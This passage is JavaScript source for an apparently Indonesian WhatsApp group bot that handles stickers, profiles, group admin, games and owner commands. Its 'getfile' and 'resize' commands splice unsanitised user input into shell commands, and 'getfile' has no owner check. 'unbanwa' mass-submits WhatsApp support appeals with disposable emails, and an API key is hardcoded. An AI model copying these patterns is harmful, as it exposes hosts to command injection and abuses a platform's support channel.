	if (!itsMe && !isOwner) return reply (mess.only.ownerB)
	listerror.splice(q, 1)
	fs.writeFileSync('./database/listerror.json', JSON.stringify(listerror))
	setReply( `Sukses menghapus ${q} di daftar error`)
	}
	break
	
	case 'listerror': {
	let errornye = `*List Error*\nJumlah : ${db.data.listerror.length}\n\n`
	for (let i of db.data.listerror){          
	errornye += `_*Command*_ : ${i.cmd}\n_*System Error*_ : ${i.error}\n\n*]─────────────────[*\n\n`             
	} 
	errornye += `© ${fake1}`
	setReply(errornye)
	}
	break
	
	
	
	
	
	
	
	
	
	case 'setnamebot':
	if (!isOwner) return onlyOwner()
	setReply(`Berhasil mengubah nama bot ke ${q}`)
	fake = `${q}`
	break
	
	
	case 'setgambar':{
	if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
	if(isImage || isQuotedImage){
	let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	await fse.copy(delb,`./stik/thumb.jpeg`)
	fs.unlinkSync(delb)
	setReply(`Berhasil mengubah thumbnail`)
	} else {
	setReply(`Kirim gambar dengan caption ${prefix}sethumb`);
	}
	}
	break;
	

	
	
			
	
	
	
	case 'addvn':{
	const client = require('filestack-js').init(fileStackApi);
	if(!isQuotedAudio) return setReply("Reply audio")
	if(!q) return setReply("Nama audionya apa?")
	if(db.data.audio[q]) return setReply("Nama tersebut sudah ada di dalam database")
	let media = await conn.downloadAndSaveMediaMessage(quoted, q)
	await client.upload(media, {}, { filename: q }, {}).then(data => {  
	db.data.audio[q] = { 
	name: data._file.name,
	id: data.handle,
	size: FileSize(data._file.size), 
	link: data.url
	}
	})
	let teks = `Berhasil menambahkan audio
	ke dalam database dengan nama *${q}*`
	await setReply(teks)
	await fs.unlinkSync(media)
	}
	break 
	
	case 'delvn':{
	if (!isOwner) return onlyOwner() 
	try {
	if(!db.data.audio[q]) return setReply("Nama tersebut tidak ada di dalam data base")
	delete db.data.audio[q]
	setReply(`Sukses delete vn ${q}`)
	} catch (err){
	console.log(err)
	setReply('eror kak')
	}
	}
	break
	
	
	 case 'addstik':{
	const client = require('filestack-js').init(fileStackApi);
	if(!isQuotedSticker) return setReply("Reply sticker")
	if(!q) return setReply("Nama stickernya apa?")
	if(db.data.sticker[q]) return setReply("Nama tersebut sudah ada di dalam database")
	let media = await conn.downloadAndSaveMediaMessage(quoted, q)
	await client.upload(media, {}, { filename: q }, {}).then(data => {  
	db.data.sticker[q] = { 
	name: data._file.name,
	id: data.handle,
	size: FileSize(data._file.size), 
	link: data.url
	}
	})
	let teks = `Berhasil menambahkan sticker
	ke dalam database dengan nama *${q}*`
	await setReply(teks)
	await fs.unlinkSync(media)
	}
	break
	
					
	
	case 'delstik':{
	if(!dev.key.fromMe & !isOwner) return setReply('Only owner')
	if (!q) return setReply("Masukan query")
	try {
	if(!db.data.sticker[q]) return setReply("Nama tersebut tidak ada di dalam data base")
	delete db.data.sticker[q]
	setReply(`Succes delete sticker ${q}!`)
	} catch (err) {
	console.log(err)
	setReply(`Gagal delete sticker ${q}!`)
	}
	}
	break
		
	case 'liststik':{
	let teks = '*Sticker list :*\n\n'
	for (let awokwkwk of Object.keys(db.data.sticker)) {
	teks += `- ${awokwkwk}\n`
	}
	teks += `\n*Total : ${Object.keys(db.data.sticker).length}*`
	setReply(teks)
	}
	break
					
					
					
	case 'listvn':
	{
	let teks = '*List Vn:*\n\n'
	for (let awokwkwk of Object.keys(db.data.audio)) {
	teks += `- ${awokwkwk}\n`
	}
	teks += `\n*Total ada : ${Object.keys(db.data.audio).length}*`
	teks += `\n\n*Untuk mengambil vn silakan ketik nama vn*`
	setReply(teks)
	}
	break
			
	
	
	
	
	
	case 'me': case 'profil': {
	let ppimg = await conn.profilePictureUrl(sender, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
	try{
	 let sol = await conn.fetchStatus(sender)
	var stst = sol.status == undefined ? '' : sol.status 
	} catch(err){
	var stst = ""
	  
	}
	let persenya =`${userPersen}`
	let nana =`${userExp}/${requiredExp}`
	
	let prmm = isPremium? isOwner? 'Premium' : user? user.premiumDate : '' : 'Not Premium'
	 //
	let teks = `*]────「 Profile User 」────[*
	
	🆔 Nama : ${pushname} 
	💳 Saldo  : Rp ${db.data.users[sender].balance.toLocaleString()}
	✅ Verified : ${userVerified}
	📇 Status : ${isPremium ? 'Premium':'Free'}
	🧬 Level : ${userLevel}
	🔰 Grade : ${userLeveling(`${db.data.users[sender].level}`)}
	⚡ Exp :  ${userXp(userPersen)} ${persenya.split(".")[0]}%
	♻️ Total Exp : ${nana}
	📟 User Hit : ${db.data.users[sender].hit}
	🤖 Status Bot : ${isOwner ? 'Owner':'User'}
	🕔 Expired : ${prmm}
	📉 Limit : ${isPremium ? 'Unlimited' : `${db.data.users[sender].limit}/${limitCount}`}
	📈 Limit Game : ${isPremium ? 'Unlimited' : `${db.data.users[sender].glimit}/${gcounti.user}`}
	📲 No : wa.me/${sender.split("@")[0]}
	🧸 Bio : ${stst}`
	
	
	let its = await getBuffer (ppimg)
	
	const canvacord = require("canvacord");
	  let image3 = new canvacord.Rank()
	  .setAvatar(its)
	  .setCurrentXP(math(userExp))
	  .setRequiredXP(requiredExp)
	  .setStatus("online")
	  .setProgressBar("#FFFFFF", "COLOR")
	  .setBackground( "COLOR","#141414")
	  .setCustomStatusColor("#ff1a8c")  
	  .setUsername(`EXP: ${persenya.split(".")[0]}%,`)
	  .setLevel(userLevel)
	  .setRank(4)
	  .setOverlay("#3d3d3d")
	  .setDiscriminator("0007");
	  
	  let foto = await getRandom(".png")
	  image3.build()
	  .then(async data => {
	  await canvacord.write(data,foto);
	  let gambar = await fs.readFileSync(foto)
	conn.sendMessage(from, { caption: teks, image: gambar}, {quoted: dev})
	  await fs.unlinkSync(foto)
			  });
	
	}
	 
	break
	
	case 'readmore':{
	const more = String.fromCharCode(8206)
	const readmore = more.repeat(4001)
	if (!q.includes('|')) return  setReply("Penggunaan teks| teks")
	const text1 = q.substring(0, q.indexOf('|') - 0)
	const text2 = q.substring(q.lastIndexOf('|') + 1)
	setReply(`${text1}${readmore}${text2}`)
	}
	break
	

case 'clearallblock':{
	if (!isOwner) return onlyOwner()
	let obj = [] 
	fs.writeFileSync('./database/userblocked.json', JSON.stringify(obj))         
	await setReply(`ALL USER BLOCKED BERHASIL DI HAPUS`)
	}
	break 
	
	
	
	case 'getppgc':
	if (!isGroup) return 
	setReply(mess.wait)
	try {
	var ppimg = await conn.profilePictureUrl(from, 'image')
	} catch (err) {
	console.log(err)
	var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
	}
	await conn.sendMessage(from, { image: { url: ppimg }}, { quoted: dev })
	break 
	
	
	case 'getpp':{
if (!isGroup) return setReply ("Digunakan Khsus Dalam Group")
if(isQuotedTag || isQuotedReply ){
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return setReply ('Reply targetnya kak atau Tag')
let userss = dev.mentionedJid[0] ? dev.mentionedJid[0] : dev.quoted ? dev.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await conn.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
conn.sendMessage(from, { image: { url: ppuser }}, { quoted: dev })
}
}
break 
	
						
				
	case 'linkgc':{
	if (!isGroup) return setReply(mess.only.group)
	if (!isBotGroupAdmins) return reply(mess.Badmin)
	var url = await conn.groupInviteCode(from).catch(() => reply(mess.error.api))
	let asu = 'https://chat.whatsapp.com/'+url
	setReply(asu)
	 }
	break
				
	case 'setnamegc':
if (!isGroup) return setReply(mess.group)
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	if (args.length < 1) return reply(`Kirim perintah ${command} teks`)
	await conn.groupUpdateSubject(from, q)
	.then( res => {
	setReply(`Sukses`)
	}).catch(() => setReply(mess.error.api))
	break
	
	case 'setdesc': 
	if (!isGroup) return setReply(mess.only.group)
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
	await conn.groupUpdateDescription(from, q)
	.then( res => {
	setReply(`Sukses`)
	}).catch(() => reply(mess.error.api))
	break
					
	case 'gc':
  if (!isGroup) return setReply(mess.group)
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	if (!q) return reply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
	if (args[0] == "close") {
	conn.groupSettingUpdate(from, 'announcement')
	setReply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
	} else if (args[0] == "open") {
	conn.groupSettingUpdate(from, 'not_announcement')
	setReply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
	} else {
	setReply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
	}
	break
	
	case 'revoke':
	if (!isGroup) return setReply(mess.only.group)
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	await conn.groupRevokeInvite(from)
	.then( res => {
	setReply(`Sukses menyetel tautan undangan grup ini`)
	}).catch(() => reply(mess.error.api))
	break
				
	

	
				
	case 'listonline': {
  if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isGroup) return setReply(mess.only.group)
	let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
	let online = [...Object.keys(store.presences[id]), botNumber]
	conn.sendText(from, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, dev, { mentions: online })
	}
	break			
				
	

	case 'emojimix': {
	let [emoji1, emoji2] = q.split`+`
	if (!emoji1) return setReply( `Example : ${prefix + command} 😅+🤔`)
	if (!emoji2) return setReply( `Example : ${prefix + command} 😅+🤔`)
	let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
	for (let res of anu.results) {
	await conn.sendImageAsSticker(from, res.url, dev)
	  //conn.sendStimg(from, res.url, dev)
	//await fs.unlinkSync(encmedia)
	}
	}
	break
	
	case 'getcaze':
	case 'getcase':
	try{
	if (!dev.key.fromMe && !isOwner) return setReply(mess.only.owner)
	if (!q) return setReply("*Mau nyari Case apa kak*") 
	if(q.startsWith(prefix)) return setReply("Query tidak boleh menggunakan prefix")
	let nana = await getCase(q)
	setReply(nana)
	} catch(err){
	console.log(err)
	setReply(`Case ${q} tidak di temukan`)
	}
	break
           
	
	         
	case 'setbio':   
	 {
	if (!isOwner && !itsMe) return setReply("Khusus Owner")
	if (!q) return setReply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} Paijo`)
	await conn.updateProfileStatus(q)
	await setReply(`Berhasil mengganti status bio ke *${q}*`)
	}
	break
	
	
	case  'speedtest': {
	let cp = require('child_process')
	let { promisify } = require('util')
	let exec2 = promisify(cp.exec).bind(cp)
	await setReply("_Testing Speed..._")
	let o
	try {
	o = await exec2('./speedtest --accept-license')
	} catch (e) {
	o = e
	} finally {
	let { stdout, stderr } = o
	function getURLs(text) {
  var urlRegex = /(https?:\/\/[^\s]+)/g;
  return text.match(urlRegex);
  }
let thumb = await getBuffer (getURLs(stdout)[0]+".png")		
if (stdout.trim()) conn.sendMessage(from, { contextInfo: { mentionedJid: [sender],
externalAdReply: {
title: `Testing Speed`, 
mediaType: 1,
renderLargerThumbnail: true,
thumbnail: thumb,
mediaUrl: `https://youtu.be/`,
sourceUrl: getURLs(stdout)[0]+".png"
}
}, text: "```"+stdout+"```"}, {quoted: dev}) 
	if (stderr.trim()) setReply(stderr)
	}
	}
	break     
	
	case 'listgc': {
	if(!isOwner) return onlyOwner()
	let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
	let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
	for (let i of anu) {
	let metadata2 = await conn.groupMetadata(i)
	teks += `◉ Nama : ${metadata2.subject}\n◉ Owner : ${metadata2.owner !== undefined ? '@' + metadata2.owner.split`@`[0] : 'Tidak diketahui'}\n◉ ID : ${metadata2.id}\n◉ Dibuat : ${moment(metadata2.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
	 }
	conn.sendTextWithMentions(from, teks, dev)
	}
	break
	
	
	case 'listpc': {
	if(!isOwner) return onlyOwner()
	let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
	let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
	for (let i of anu) {
	let nama = store.messages[i].array[0].pushName
	teks += `◉ Nama : ${nama}\n◉ User : @${i.split('@')[0]}\n◉ Chat : https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
	}
	conn.sendTextWithMentions(from, teks, dev)
	 }
	break
	
	

	

				
	case 'clearalluser':
	if (!isOwner) return onlyOwner()
	setReply("Sukses clear all User")
	db.data.users = {}
	break 
				
				
				
	case 'getfile':{
	let cp = require('child_process')
	let { promisify } = require('util')
	let exec2 = promisify(cp.exec).bind(cp)
	if (!q) return setReply( `uhm.. teksnya mana?\n\ncontoh\n${prefix + command} main`)
	setReply('Executing...')
	let o
	try {
	o = await exec2('type ' + q)
	} catch (e) {
	o = e
	} finally {
	 let { stdout, stderr } = o
	if (stdout.trim()) setReply(stdout)
	if (stderr.trim()) setReply(stderr)
	}
	}
	break
	

    
	case 'math': case 'match': case 'mtk': case 'matematika': {
		let modes = {
	  noob: [-3, 3, -3, 3, '+-', 10000, 500],
	  easy: [-10, 10, -10, 10, '*/+-', 15000, 600],
	  medium: [-40, 40, -20, 20, '*/+-', 15000, 730],
	  hard: [-100, 100, -70, 70, '*/+-', 20000, 850],
	  extreme: [-999999, 999999, -999999, 999999, '*/', 20000, 1000],
	  impossible: [-99999999999, 99999999999, -99999999999, 999999999999, '*/', 30000, 2500],
	  impossible2: [-999999999999999, 999999999999999, -999, 999, '/', 35000, 3000]
	}
	
	
	let operators = {
	  '+': '+',
	  '-': '-',
	  '*': '×',
	  '/': '÷'
	}
	
	function genMath(mode) {
	  let [a1, a2, b1, b2, ops, time, bonus] = modes[mode]
	  let a = randomInt(a1, a2)
	  let b = randomInt(b1, b2)
	  let op = pickRandom([...ops])
	  let result = (new Function(`return ${a} ${op.replace('/', '*')} ${b < 0 ? `(${b})` : b}`))()
	  if (op == '/') [a, result] = [result, a]
	  return {
		str: `${a} ${operators[op]} ${b}`,
		mode,
		time,
		bonus,
		result
	  }
	}
	
	function randomInt(from, to) {
	  if (from > to) [from, to] = [to, from]
	  from = Math.floor(from)
	  to = Math.floor(to)
	  return Math.floor((to - from) * Math.random() + from)
	}
	
		

	 // conn.math = conn.math ? conn.math : {}
	  if (!q) return setReply( `*MATEMATIKA*
   
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────    
	contoh:
	${prefix}math hard
	`)
	  let mode = args[0].toLowerCase()
	  if (!(mode in modes)) return setReply( `
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────    
	contoh:
	${prefix}math hard
	`)
	  let id = from
	  if (id in conn.math) return setReply('Masih ada soal belum terjawab di chat ini')
	  let math2 = genMath(mode)
	  conn.math[id] = [
		await reply(`*MATEMATIKA*\n\nBerapa hasil dari *${math2.str}*?\n\nTimeout: ${(math2.time / 1000).toFixed(2)} detik\nBonus Jawaban Benar: Rp ${math2.bonus} `),
		math2, 4,
		setTimeout(async () => {
		if (conn.math[id]) await setReply(`Waktu habis!\nJawabannya adalah ${math2.result}\n\n${math2.mode.toUpperCase()}\n\nmath ${math2.mode}`)
	   delete conn.math[id]
		}, math2.time)
	  ]
	}
	break
	
	
	
	
	case 'unbanwa':{
try{ 
if (!q) return setReply ('Masukan Nomor')
  let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", `${q}`)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `olá WhatsApp, minha conta do WhatsApp foi bloqueada/desativada pelo WhatsApp e não acho que tenha violado os regulamentos do WhatsApp, abra minha conta do WhatsApp de volta ao normal para que eu possa interagir sem problemas novamente, abra minha conta desativada [ ${q} ]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
setReply (`WhatsApp Support

Hai,
Terima kasih telah menghubungi kami.

Kami mengerti bahwa saat ini Anda tidak dapat mengakses WhatsApp dan kami sedang bekerja dengan giat untuk menjawab permohonan Anda. Terima kasih untuk kesabaran Anda, dan kami akan berusaha untuk membalas email Anda secepat mungkin. Untuk informasi selengkapnya, silakan baca artikel dibawah ini.
Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami. 

Kami akan dengan senang hati membantu!

*WHATSAPP SUPPORT:*
https://faq.whatsapp.com/465883178708358`)
} else if (payload.includes(`"payload":false`)) {
  setReply (`Terima kasih telah menghubungi kami. Dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
}
} catch (err){
                console.log(err)
  setReply (`${err}`)
            }
}
break
  

	
	 case 'react': {
	//if (!isOwner) return setReply( mess.only.owner)
	if(!q) return setReply(`Contoh ${prefix+command} 😝`)
	let reactionMessage = {
	react: {
	text: args[0],
	key: { remoteJid: from, fromMe: true, id: quoted.id }
	}
	}
	conn.sendMessage(from, reactionMessage)
	}
	break  
	
	
	
	
	
	
	

	
	case 'translate': case 'tr': {
if(isText || isQuotedText) {
let translate = require('translate-google-api')
let defaultLang = 'en'
let tld = 'cn'
let err = `
Contoh:
${prefix + command} <lang> [text]
${prefix + command} id your messages
Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
`.trim()

let lang = args[0]
let text = args.slice(1).join(' ')
if ((args[0] || '').length !== 2) {
lang = defaultLang
text = args.join(' ')
}
if (!text && m.quoted && m.quoted.text) text = m.quoted.text
let result
try {
result = await translate(`${text}`, {to: lang})
} catch (e) {
result = await translate(`${text}`, {to: defaultLang,})
setReply(err)
} finally {
setReply(result[0])
}
} else {
	reply( `• *Example* : ${prefix + command} text/reply\n\n_Gesek pesan ini kekanan untuk mentranslate teks tersebut_`  )           
	}
}
break

	
	case  'dashboard':{
	const d = (await import("lowdb")).default;
	const getFolderSize = (await import("get-folder-size")).default;
	let storage = await getFolderSize.loose('.');
	let moduls = await getFolderSize.loose('./node_modules');
	let session = await getFolderSize.loose('./session')
	let databse = await getFolderSize.strict('./database/database.json');
	for (let i of hitnya){
	let cekvipp = ms(i.expired - Date.now())
	var resetnye = `${cekvipp.hours} jam ${cekvipp.minutes} menit`             
	 } 
	
	 
	  
	let teks =`
	*Dashboard*     
	Runtime : ${runtime(process.uptime())}
	Reset : ${resetnye}
	Total Hit : ${thisHit.toLocaleString()}
	
	*Storage*
	Internal : ${FileSize(storage)}
	Modules : ${FileSize(moduls)}
	Session : ${FileSize(session)}
	Database : ${FileSize(databse)}
	`
	let fall ="*Commands Today*  \n"
	let totalFail =[]
	let totalSuc = []
	let total = 0
	let tot = 0
	await dash.map(async function(e, i){
	fall += "*•*"+` ${e.cmd} : ${e.succes+e.failed} \n`   
	await totalFail.push(e.failed)
	await totalSuc.push(e.succes)
	});
		 
	for(let i = 0; i < totalFail.length; i++){
	total += totalFail[i]
	} 
	
	  for(let a = 0; a < totalSuc.length; a++){
		  tot += totalSuc[a]
		  } 
	 
	let akoh = `Total : ${dash.length} used`
	let tod ="*Command Failed*\n"
	let filteredArray = await dash.filter(item => item.failed > 0 )
	await filteredArray.map(async function(e, i){
	tod += "*•*"+` ${e.cmd} : ${e.failed} \n`   
	
	});
	let aw = `Total : ${filteredArray.length} failed`    
	let tekz = teks+"\n\n"+fall+"\n"+akoh+"\n\n"+"*Command Status* \n"+" *•* Succes : "+tot+"\n"+" *•* Failed : "+total+"\n\n"+tod+"\n\n"
	setReply(tekz)                                                        
	}
	break
	
	
	

	
	
	
	
	case  'addowner':{
	if (!isOwner) return onlyOwner()
	if (!isGroup) return setReply(mess.only.group)
	if(checkDataId("owner", Input,  DataId)) return setReply("User sudah menjadi owner")
	if(!checkDataName("owner", Input, DataId)) { await createDataId("owner", DataId) }
	addDataId(Input, "owner", DataId)
	setReply(`Berhasil menambahkan ${Input} ke daftar owner`)
	}
	break
	
	case  'delowner':
	if (!isOwner) return onlyOwner() 
	try {
	if(!checkDataId("owner", Input, DataId)) return setReply(`User bukan owner`)
	removeDataId ("owner", Input, DataId)
	setReply(`Berhasil menghapus ${Input.split("@")[0]} ke daftar owner`)
	} catch (err){
	console.log(err)
	setReply(`${err}`)
	}
	break
	
	
	
	
	
	case  'addcmdowner':{
	if (!isOwner) return onlyOwner()
	if(!q) return setReply(mess.query)
	if(checkDataId("commands", q,  DataId)) return setReply("User sudah menjadi owner")
	if(!checkDataName("commands", q, DataId)) { await createDataId("commands", DataId) }
	addDataId(q, "commands", DataId)
	setReply(`Berhasil menambahkan ${q} ke daftar fitur owner`)
	}
	break
	  
	  case  'delcmdowner':
	  if(!q) return setReply(mess.query)
	  if (!isOwner) return onlyOwner() 
	  try {
	  if(!checkDataId("commands", q, DataId)) return setReply(`User bukan owner`)
	  removeDataId ("commands", q, DataId)
	  setReply(`Berhasil menghapus ${q} ke daftar fitur owner`)
	  } catch (err){
	  console.log(err)
	  setReply(`${err}`)
	  }
	  break
	
	  case 'listcmdowner':{
	  let nana = await DataId.filter(item => item.name == "commands" )
	  let teks ="List Commands For Owner\n"
	  let nunu = nana[0].id
	  for(let i of nunu){
		teks +=`. ${i}\n`   
		}    
	  setReply(teks)
	  }
	  break
	  
	  
	  
	  
	  case  'addcmdprem':{
	if (!isOwner) return onlyOwner()
	if(!q) return setReply(mess.query)
	if(checkDataId("premium", q,  DataId)) return setReply("Command sudah ada di database")
	if(!checkDataName("premium", q, DataId)) { await createDataId("premium", DataId) }
	addDataId(q, "premium", DataId)
	setReply(`Berhasil menambahkan ${q} ke daftar fitur premium`)
	}
	break
	  
	  case  'delcmdprem':
	 if (!isOwner) return onlyOwner() 
	  if(!q) return setReply(mess.query)
	  try {
	  if(!checkDataId("premium", q, DataId)) return setReply("Command tidak ada di database")
	  removeDataId ("premium", q, DataId)
	  setReply(`Berhasil menghapus ${q} ke daftar fitur premium`)
	  } catch (err){
	  console.log(err)
	  setReply(`${err}`)
	  }
	  break
	  
	case 'listcmdprem':{
	  if(!checkDataName("premium", q, DataId)) { await createDataId("premium", DataId) }
	  let nana = await DataId.filter(item => item.name == "premium" )
	  let teks ="List Command For Premium User\n\n"
	  let nunu = nana[0].id
	  for(let i of nunu){
		teks +=`• ${toFirstCase(i)}\n`   
		}    
	   teks +=`\n• Total: ${nunu.length}\n` 
	  setReply(teks)
	  }
	  break  
	
	
	
	case  'addcmdlimit':{
	if (!isOwner) return onlyOwner()
	if(!q) return setReply(mess.query)
	if(checkDataId("limit", q,  DataId)) return setReply("Command sudah ada di database")
	if(!checkDataName("limit", q, DataId)) { await createDataId("limit", DataId) }
	addDataId(q, "limit", DataId)
	setReply(`Berhasil menambahkan ${q} ke daftar fitur limit`)
	}
	break
	  
	  case  'delcmdlimit':
	  if(!q) return setReply(mess.query)
	  if (!isOwner) return onlyOwner() 
	  try {
	  if(!checkDataId("limit", q, DataId)) return setReply("Command tidak ada di database")
	  removeDataId ("limit", q, DataId)
	  setReply(`Berhasil menghapus ${q} ke daftar fitur limit`)
	  } catch (err){
	  console.log(err)
	  setReply(`${err}`)
	  }
	  break
	  
	case 'listcmdlimit':{
	  let nana = await DataId.filter(item => item.name == "limit" )
	  let teks ="List Commands For limit\n"
	  let nunu = nana[0].id
	  for(let i of nunu){
		teks +=`. ${i}\n`   
		}    
	  setReply(teks)
	  }
	  break
	
	
	case 'resize':
	if (isQuotedImage || isImage) {
	if(!q) return setReply(`Masukan ukuran panjangxlebar, contoh ${prefix+command} 300x300`)
	setReply(mess.wait)
	let panjang = q.split('x')[0] 
	let lebar = q.split('x')[1] 
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.jpeg')
	exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar}  ${ran}`, async (err) => {
	fs.unlinkSync(media)
	if (err) return setReply(`Err: ${err}`)
	let buffer453 = fs.readFileSync(ran)
	await conn.sendMessage(from, {mimetype: 'image/jpeg', image: buffer453, caption: `Nih ${q}`}, { quoted: dev })
	fs.unlinkSync(ran)
	})
	} else {
	setReply("Reply Imagenya")
	}
	break
	
	
	case 'infoall': case 'tagall':
    if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isGroup) return setReply(mess.only.group)
	if(!q) {
	var inpo = "No inpo"
	} else var inpo = q
	let members_id = []
	let tes = '\n'
	await groupMembers.map( i => {
	tes += `┣ ⬣@${i.id.split('@')[0]}\n`
	members_id.push(i.id) })
	mentions(`
	*From :* ${pushname}
	
	 Info :  ${inpo}
	
	Total Member : ${groupMembers.length} 
	
	┏━⬣`+tes+`┗━⬣`, members_id, false)
	break
	
	
	
	
	
		
	
	  case 'getallstik':
	let stiker1 = Object.keys(db.data.sticker)
	for (let jid of stiker1){
	await conn.sendMessage(from, {sticker: {url: db.data.sticker[jid].link }})
	await sleep(1000)
	}
	break
	
	case 'antivirtex':{
  if (!isGroup) return setReply(mess.group)
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	 if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (isAntiVirtex) return setReply("Sudah aktif!!");
	db.data.chats[from].antivirtex = true
	setReply("Sukses mengaktifkan antivirtex!");
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!isAntiVirtex) return setReply("Udah off!!");
	db.data.chats[from].antivirtex = false
	setReply("Sukses mematikan antivirtex!");
	} else if (!q) {
	reply ( `*MODE ANTI VIRTEX*\n ${prefix+command} on/off`)
	 }
	 }
	break;
	
	
	case 'antiwame':{
  if (!isGroup) return setReply(mess.group)
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	 if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (isAntiWame) return setReply("Sudah aktif!!");
	db.data.chats[from].antiwame = true
	setReply("Sukses mengaktifkan antiwame!");
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!isAntiWame) return setReply("Udah off!!");
	db.data.chats[from].antiwame = false
	setReply("Sukses mematikan antiwame!");
	} else if (!q) {
	reply ( `*MODE ANTI WAME*\n ${prefix+command} on/off`)
	 }
	 }
	break;
	
	case 'listowner':{
	  if(!checkDataName("owner", q, DataId)) { await createDataId("owner", DataId) }
	  let nana = await DataId.filter(item => item.name == "owner" )
	  if(!nana) return setReply("Tidak ada")
	  let teks ="List Owner\n"
	  let nunu = nana[0].id
	  for(let i of nunu){
		teks +=`- wa.me/${i.split("@")[0]} \n`   
		}    
	  setReply(teks)
	  }
	  break
	  
	
	  
	
	case 'limit':
	case 'ceklimit': 
	if(mentionByReply){
	let nomer = mentionByReply.split("@")[0]
	 setReply(`*${await conn.getName(mentionByReply)}*\n\nLimit : ${isPremium ? 'Unlimited' : `${db.data.users[mentionByReply].limit}/${limitCount}`}\nLimit Game : ${isPremium ? 'Unlimited' : `${db.data.users[mentionByReply].glimit}/${gcount}`}\nSaldo : Rp ${db.data.users[mentionByReply].balance.toLocaleString()}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit\nAtau ketik .buyprem untuk membeli unlimited limit`) 
	} else {   
	setReply(`*${pushname}*\n\nLimit : ${isPremium ? 'Unlimited' : `${db.data.users[sender].limit}/${limitCount}`}\nLimit Game : ${isPremium ? 'Unlimited' : `${db.data.users[sender].glimit}/${gcount}`} \nSaldo : Rp ${db.data.users[sender].balance.toLocaleString()}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit\nAtau ketik .buyprem untuk membeli unlimited limit`)
